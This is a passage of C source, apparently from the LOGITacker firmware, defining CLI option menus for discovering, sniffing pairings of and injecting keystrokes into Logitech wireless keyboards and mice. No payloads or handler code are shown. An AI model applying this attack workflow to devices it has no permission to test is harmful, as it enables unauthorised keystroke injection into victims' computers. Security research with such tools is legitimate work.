    NRF_CLI_CMD(on, NULL, "enable", NULL),
    NRF_CLI_CMD(off, NULL, "disable", NULL),
    NRF_CLI_SUBCMD_SET_END
};

NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_defaultscript)
{
    NRF_CLI_CMD(clear, NULL, "clear default script", cmd_options_inject_defaultscript_clear),
    NRF_CLI_SUBCMD_SET_END
};

// options passive-enum
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_passiveenum)
{
    NRF_CLI_CMD(pass-through-keyboard, &m_sub_options_on_off, "pass received keyboard reports to LOGITacker's USB keyboard interface", cmd_options_passiveenum_pass_keyboard),
    NRF_CLI_CMD(pass-through-mouse, &m_sub_options_on_off, "pass received mouse reports to LOGITacker's USB mouse interface", cmd_options_passiveenum_pass_mouse),
    NRF_CLI_CMD(pass-through-raw, &m_sub_options_on_off, "pass all received RF reports to LOGITacker's USB hidraw interface", cmd_options_passiveenum_pass_raw),
    NRF_CLI_SUBCMD_SET_END
};

// options discover onhit
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_discover_onhit)
{
    NRF_CLI_CMD(continue,   NULL, "stay in discover mode.", cmd_discover_onhit_continue),
    NRF_CLI_CMD(active-enum, NULL, "enter active enumeration mode", cmd_discover_onhit_activeenum),
    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration mode", cmd_discover_onhit_passiveenum),
    NRF_CLI_CMD(auto-inject, NULL, "enter injection mode and execute injection", cmd_discover_onhit_autoinject),
    NRF_CLI_SUBCMD_SET_END
};

// options discover
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_discover)
{
    NRF_CLI_CMD(pass-through-raw, &m_sub_options_on_off, "pass all received promiscuous RF reports to LOGITacker's USB hidraw interface", cmd_options_discover_pass_raw),
    NRF_CLI_CMD(onhit, &m_sub_options_discover_onhit, "select action to take when device a RF address is discovered", cmd_help),
    NRF_CLI_CMD(auto-store-plain-injectable, &m_sub_options_on_off, "automatically store discovered devices to flash if they allow plain injection", cmd_options_discover_autostoreplain),
    NRF_CLI_SUBCMD_SET_END
};

//options pair-sniff onsuccess
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_pairsniff_onsuccess)
{
        NRF_CLI_CMD(continue, NULL, "continue to sniff pairing attempts", cmd_pair_sniff_onsuccess_continue),
        NRF_CLI_CMD(passive-enum, NULL, "start passive enumeration of newly paired device", cmd_pair_sniff_onsuccess_passiveenum),
        NRF_CLI_CMD(active-enum, NULL, "start passive enumeration of newly paired device", cmd_pair_sniff_onsuccess_activeenum),
        NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_pair_sniff_onsuccess_discover),
        NRF_CLI_CMD(auto-inject, NULL, "enter injection mode and execute injection", cmd_pair_sniff_onsuccess_autoinject),

        NRF_CLI_SUBCMD_SET_END
};


// options pair-sniff
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_pairsniff)
{
    // ToDo: raw pass-through for pair sniff
    //NRF_CLI_CMD(pass-through-raw, &m_sub_options_on_off, "pass all pairing RF reports to LOGITacker's USB hidraw interface (not implemented)", NULL),
    NRF_CLI_CMD(pass-through-raw, NULL, "pass all pairing RF reports to LOGITacker's USB hidraw interface (not implemented)", NULL),
    NRF_CLI_CMD(onsuccess, &m_sub_options_pairsniff_onsuccess, "select action after a successful pairing has been captured", cmd_help),
    NRF_CLI_CMD(auto-store-pair-sniffed-devices, &m_sub_options_on_off, "automatically store devices after pairing has been sniffed successfully", cmd_options_pairsniff_autostoredevice),
    NRF_CLI_SUBCMD_SET_END
};

// options inject onsuccess
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_onsuccess)
{
    NRF_CLI_CMD(continue,   NULL, "stay in inject mode.", cmd_inject_onsuccess_continue),
    NRF_CLI_CMD(active-enum, NULL, "enter active enumeration", cmd_inject_onsuccess_activeenum),
    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration", cmd_inject_onsuccess_passiveenum),
    NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_inject_onsuccess_discover),
    NRF_CLI_SUBCMD_SET_END
};
// options inject onfail
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject_onfail)
{
    NRF_CLI_CMD(continue,   NULL, "stay in inject mode.", cmd_inject_onfail_continue),
    NRF_CLI_CMD(active-enum, NULL, "enter active enumeration", cmd_inject_onfail_activeenum),
    NRF_CLI_CMD(passive-enum, NULL, "enter passive enumeration", cmd_inject_onfail_passiveenum),
    NRF_CLI_CMD(discover, NULL, "enter discover mode", cmd_inject_onfail_discover),
    NRF_CLI_SUBCMD_SET_END
};

// options inject
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_inject)
{
    NRF_CLI_CMD(language, NULL, "set injection keyboard language layout", cmd_options_inject_lang),

    NRF_CLI_CMD(default-script, &m_sub_options_inject_defaultscript, "name of inject script which is loaded at boot", cmd_options_inject_defaultscript),
    NRF_CLI_CMD(clear-default-script, NULL, "clear script which should be loaded at boot", cmd_options_inject_defaultscript_clear),
    NRF_CLI_CMD(auto-inject-count,   NULL, "maximum number of auto-injects per device", cmd_options_inject_maxautoinjectsperdevice),

    NRF_CLI_CMD(onsuccess, &m_sub_options_inject_onsuccess, "action after successful injection", cmd_help),
    NRF_CLI_CMD(onfail, &m_sub_options_inject_onfail, "action after failed injection", cmd_help),


    NRF_CLI_SUBCMD_SET_END
};


// options global workmode
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_workmode)
{
    NRF_CLI_CMD(unifying,   NULL, "Unifying compatible workmode.", cmd_option_global_workmode_unifying),
    NRF_CLI_CMD(lightspeed,   NULL, "G-Series LIGHTSPEED workmode.", cmd_option_global_workmode_lightspeed),
    NRF_CLI_CMD(g700,   NULL, "G700/G700s receiver workmode.", cmd_option_global_workmode_g700),
    NRF_CLI_SUBCMD_SET_END
};

// options global usbinjectmode
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_usbinjectmode)
{
    NRF_CLI_CMD(powerup,   NULL, "Start USB injection when device is powered on (not accurate, but on every OS).", cmd_option_global_usbinjecttrigger_onpowerup),
    NRF_CLI_CMD(ledupdate,   NULL, "Start USB injection when device receives a keyboard LED report (accurate, not on every OS) ", cmd_option_global_usbinjecttrigger_onledupdate),
    NRF_CLI_SUBCMD_SET_END
};

// options global workmode
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global_bootmode)
{
    NRF_CLI_CMD(discover,   NULL, "Boot in 'discover' mode.", cmd_option_global_bootmode_discover),
    NRF_CLI_CMD(usbinject,   NULL, "Boot in 'USB key stroke injection' mode.", cmd_option_global_bootmode_usbinject),
    NRF_CLI_SUBCMD_SET_END
};

// options global
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options_global)
{
    NRF_CLI_CMD(workmode, &m_sub_options_global_workmode, "LOGITacker working mode", cmd_help),
    NRF_CLI_CMD(bootmode, &m_sub_options_global_bootmode, "LOGITacker boot mode", cmd_help),
    NRF_CLI_CMD(usbtrigger, &m_sub_options_global_usbinjectmode, "When to trigger USB injection", cmd_help),

    NRF_CLI_SUBCMD_SET_END
};

// options
NRF_CLI_CREATE_STATIC_SUBCMD_SET(m_sub_options)
{
    NRF_CLI_CMD(show, NULL, "print current options", cmd_options_show),
    NRF_CLI_CMD(store,   NULL, "store current options to flash (persist reboot)", cmd_options_store),
    NRF_CLI_CMD(erase,   NULL, "erase options from flash (defaults after reboot)", cmd_options_erase),

    NRF_CLI_CMD(passive-enum, &m_sub_options_passiveenum, "options for passive-enum mode", cmd_help),

    NRF_CLI_CMD(discover, &m_sub_options_discover, "options for discover mode", cmd_help),

    NRF_CLI_CMD(pair-sniff, &m_sub_options_pairsniff, "options for pair sniff mode", cmd_help),

    NRF_CLI_CMD(inject, &m_sub_options_inject, "options for inject mode", cmd_help),

    NRF_CLI_CMD(global, &m_sub_options_global, "global options", cmd_help),


    //NRF_CLI_CMD(pass-keyboard,   NULL, "pass-through keystrokes to USB keyboard", cmd_options_passiveenum_pass_keyboard),
    //NRF_CLI_CMD(pass-mouse,   NULL, "pass-through mouse moves to USB mouse", cmd_options_passiveenum_pass_mouse),

    NRF_CLI_SUBCMD_SET_END
};
NRF_CLI_CMD_REGISTER(options, &m_sub_options, "options", cmd_help);
